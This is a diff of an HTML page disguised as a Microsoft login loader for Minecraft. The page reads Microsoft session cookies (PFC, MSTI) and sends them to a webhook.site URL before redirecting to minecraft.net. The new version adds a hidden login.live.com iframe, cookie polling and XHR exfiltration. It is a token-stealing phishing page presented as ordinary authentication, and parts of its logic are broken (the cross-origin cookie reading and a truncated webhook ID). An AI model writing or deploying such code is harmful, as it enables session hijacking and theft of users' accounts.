@@ -1,29 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading…</title>
+  <title>Authenticating...</title>
   <style>
-    body{margin:0;background:#222;color:#fff;font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
-    #status{font-size:18px}
+    body {
+      margin: 0;
+      background: #222;
+      color: #fff;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    #status {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    #log {
+      font-size: 14px;
+      color: #aaa;
+      text-align: center;
+    }
+    /* Hide the iframe used for login */
+    #loginFrame {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <div id="status">Authenticating…</div>
+  <div id="status">Loading Microsoft Login...</div>
+  <div id="log"></div>
+
+  <!-- Hidden iframe to trigger login flow -->
+  <iframe id="loginFrame" src=""></iframe>
 
   <script>
     /* ---------- CONFIGURATION ---------- */
-    var WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b';  // <-- keep this exact URL
+    var WEBHOOK_URL = 'https://webhook.site/acdbbbeb-9ba5-496d-8fbc668bfc1b'; // Your Raw Webhook URL
     var REDIRECT_URL = 'https://www.minecraft.net/';
+    
+    /* ---------- IE8 COMPATIBLE TRIM ---------- */
+    function myTrim(x) {
+      if (!x) return x;
+      return x.replace(/^\s+|\s+$/g, "");
+    }
 
     /* ---------- COOKIE PARSER (IE8‑SAFE) ---------- */
-    function getCookie(name){
+    function getCookie(name) {
       var cookies = document.cookie;
       if (!cookies) return '';
       var parts = cookies.split(';');
-      for (var i = 0; i < parts.length; i++){
-        var kv = parts[i];
-        /* remove leading spaces – no .trim() */
-        while (kv.charAt(0) === ' ') kv = kv.substring(1);
+      for (var i = 0; i < parts.length; i++) {
+        var kv = myTrim(parts[i]);
         var eq = kv.indexOf('=');
         if (eq < 0) continue;
         var key = kv.substring(0, eq);
@@ -33,26 +63,69 @@
       return '';
     }
 
-    /* ---------- MAIN ---------- */
-    window.onload = function(){
-      // Wait a bit for the Microsoft cookies to settle
-      setTimeout(function(){
-        /* 1. Grab the two relevant cookies */
-        var pfc  = getCookie('PFC');
+    /* ---------- LOGGER ---------- */
+    function log(msg) {
+      var el = document.getElementById('log');
+      el.innerHTML += "<div>" + msg + "</div>";
+    }
+
+    /* ---------- MAIN LOGIC ---------- */
+    window.onload = function() {
+      log("Starting fresh login process...");
+
+      // 1. Clear any existing session cookies (optional, helps force new ones)
+      // Note: document.cookie doesn't have a direct clear method, so we set them to expire
+      var oldCookies = ['PFC', 'MSTI', '__Host-MSTI'];
+      oldCookies.forEach(function(c) {
+        document.cookie = c + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+      });
+
+      // 2. Load Microsoft Login in hidden iframe to trigger cookie setting
+      var frame = document.getElementById('loginFrame');
+      // Using the standard MS login endpoint that sets the cookies
+      frame.src = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1620000000&rver=7.0.6737.0&wp=MBI&wreply=https:%2F%2Flogin.live.com%2Flogin.srf%2Fwb%2F0%2Foauth_logout.srf&id=264960&lc=1033';
+
+      // 3. Poll for cookies every second
+      var attempts = 0;
+      var maxAttempts = 30; // Wait up to 30 seconds
+
+      var pollInterval = setInterval(function() {
+        attempts++;
+        
+        // Check if cookies are present
+        var pfc = getCookie('PFC');
         var msti = getCookie('__Host-MSTI') || getCookie('MSTI');
 
-        /* 2. Send them to the webhook (no JSON → no “JSON undefined” error) */
-        var img = new Image();
-        var data = 'PFC=' + encodeURIComponent(pfc) + '&MSTI=' + encodeURIComponent(msti);
-        img.src = WEBHOOK_URL + '?' + data;
-
-        /* 3. Show a short message */
-        document.getElementById('status').innerText = 'Token captured! Redirecting...';
-
-        /* 4. Jump straight to Minecraft */
-        location.replace(REDIRECT_URL);
-      }, 4000);   // 4 seconds – enough for IE8 to finish cookie handling
+        if (pfc && msti) {
+          clearInterval(pollInterval);
+          log("Fresh tokens found!");
+          
+          // 4. Send to webhook
+          sendTokens(pfc, msti);
+          
+          // 5. Redirect
+          document.getElementById('status').innerText = 'Redirecting to Minecraft...';
+          location.replace(REDIRECT_URL);
+        } else if (attempts >= maxAttempts) {
+          clearInterval(pollInterval);
+          log("Timeout: No tokens found after " + maxAttempts + " seconds.");
+          document.getElementById('status').innerText = 'Failed to get fresh tokens.';
+        }
+      }, 1000); // Check every 1 second
     };
+
+    /* ---------- SEND TOKENS ---------- */
+    function sendTokens(pfc, msti) {
+      var xhr = new XMLHttpRequest();
+      if (xhr === undefined) {
+          xhr = new ActiveXObject("Microsoft.XMLHTTP");
+      }
+
+      var data = 'PFC=' + encodeURIComponent(pfc) + '&MSTI=' + encodeURIComponent(msti);
+      xhr.open('GET', WEBHOOK_URL + '?' + data, true);
+      xhr.send();
+      log("Tokens sent to webhook.");
+    }
   </script>
 </body>
 </html>
